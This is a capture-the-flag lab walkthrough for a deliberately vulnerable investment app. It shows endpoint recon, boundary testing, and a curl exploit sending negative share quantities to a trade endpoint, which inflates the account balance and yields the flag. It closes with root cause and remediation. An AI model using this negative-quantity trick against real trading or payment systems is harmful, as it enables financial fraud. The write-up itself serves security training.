# BugForge Daily Lab — Walkthrough

**Lab:** Shady Oaks Financial (investment platform)
**URL:** `https://lab-1781552748149-9dm3f5.labs-app.bugforge.io/`
**Category / Hint:** Broken Logic
**Flag:** `bug{tVIGc3ZDR1cVgPI6jY7GgK1625S2vyHZ}`
**Vulnerability class:** Business Logic Flaw — missing input validation on a financial quantity (CWE-840 / CWE-20)

---

## 1. Reconnaissance

The landing page is a near-empty React SPA:

```html
<title>Shady Oaks Financial</title>
<script defer src="/static/js/main.799d296b.js"></script>
```

All application logic lives in the JS bundle. Downloading and grepping it revealed the API surface and client-side routes.

**API endpoints discovered:**

```
/api/register        /api/login           /api/profile
/api/portfolio       /api/trade           /api/transactions
/api/convert-currency /api/currencies     /api/exchange-rates
/api/stocks          /api/forecast/...    /api/alerts
/api/forgot-password /api/reset-password  /api/verify-token
/api/portfolio/share /api/public/portfolio/:token
/api/admin/stats     /api/admin/users     /api/admin/transactions  /api/admin/stocks/
```

Key observation: the platform tracks **multi-currency balances** (`balance_eur`, `balance_usd`, `balance_gbp`) and has two money-movement engines — **currency conversion** and **stock trading**. Both are prime targets for a "broken logic" challenge.

---

## 2. Establishing a session

Registering a user is open and returns a JWT plus the user object:

```bash
curl -s -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"pentest_bf01","email":"pentest_bf01@example.com","password":"Passw0rd!23"}'
```

```json
{"token":"<JWT>","user":{"id":4,"role":"user","balance_eur":1000,
 "balance_usd":0,"balance_gbp":0,"is_premium":0}}
```

Starting capital: **€1000**.

---

## 3. Probing the money engines

### Currency conversion — properly hardened
A normal conversion behaves correctly (100 EUR → 98.19 USD, source debited, target credited). Edge cases were rejected:

| Test | Result |
|------|--------|
| `amount: -1000000` (negative) | `{"error":"Invalid conversion parameters"}` |
| Convert more than balance | `{"error":"Insufficient balance"}` |

The exchange rates were also internally consistent — no triangular arbitrage. **Dead end.**

### Stock trading — the flaw
The `/api/trade` endpoint takes `{stock_id, shares, action}`. Testing the boundaries:

| Test | Server response | Effect |
|------|-----------------|--------|
| `buy` 1 share | OK, cost €78.88 | normal |
| `sell` 100 shares (none owned) | `{"error":"Insufficient shares"}` | blocked ✔ |
| `sell` **-100** shares | "Stock sold successfully", revenue **-7888** | balance went *negative* |
| `buy` **-100** shares | "Stock purchased successfully", cost **-7888** | balance *increased* |

The sell path checks holdings, but **neither path validates that `shares` is positive.**

---

## 4. The Broken Logic

The server computes the trade arithmetic as:

```
cost    = shares * price
balance = balance - cost     # for a BUY
```

With a **negative `shares`** value on a **buy**, `cost` becomes negative, and subtracting a negative number **credits** the account. There is no sign/range check, so the quantity can be arbitrarily large.

---

## 5. Exploitation

```bash
curl -s -X POST "$BASE/api/trade" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stock_id":1,"shares":-10000000,"action":"buy"}'
```

Response:

```json
{
  "message": "Stock purchased successfully",
  "shares": "-10000000.0000",
  "price": 79.59,
  "total_cost": "-795900000.00",
  "new_balance": "795900821.12",
  "tier": "platinum",
  "flag": "bug{tVIGc3ZDR1cVgPI6jY7GgK1625S2vyHZ}"
}
```

Balance jumped from ~€821 to **€795,900,821.12**, crossing the **platinum-tier** threshold, which caused the server to award the flag directly in the trade response.

### 🚩 Flag
```
bug{tVIGc3ZDR1cVgPI6jY7GgK1625S2vyHZ}
```

---

## 6. Root Cause & Remediation

**Root cause:** The trade handler validates `action` and (on sell) share ownership, but never validates the sign or magnitude of `shares`. A negative quantity inverts the cost calculation.

**Fix:**
- Reject non-positive, non-finite, or out-of-range `shares` **server-side** before any balance arithmetic (`shares > 0`, sane upper bound).
- Apply the same validation uniformly to *every* action (buy and sell) and to all monetary inputs.
- Add server-side invariants/assertions (e.g., a trade must never increase cash on a buy) and reconcile balances transactionally.
- Treat all client-supplied numeric values as untrusted — never trust client-side validation alone.

**Lesson:** Consistent input validation must be applied across *all* money paths. Here, currency conversion was correctly hardened while the trade endpoint was not — a single inconsistent code path was enough to break the platform's economy.
